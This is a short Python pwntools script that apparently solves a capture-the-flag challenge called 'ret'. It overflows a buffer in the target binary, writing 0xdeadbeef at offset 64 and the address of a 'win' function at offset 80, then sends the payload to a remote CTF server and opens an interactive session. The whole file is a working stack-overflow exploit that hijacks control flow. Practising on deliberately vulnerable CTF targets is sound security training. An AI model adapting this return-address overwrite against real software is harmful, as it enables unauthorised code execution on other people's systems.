from pwn import *

f = context.binary = ELF('ret')
#io = f.process()
winaddr = f.symbols['win']
io = remote("ctf.hackucf.org", 9003)
# pack 0xdeadbeef in to local int at offset 64 and addresss of win at offset 80
payload = fit({
    64: 0xdeadbeef,
    80: winaddr
})

print(payload)
io.sendline(payload)
io.interactive()

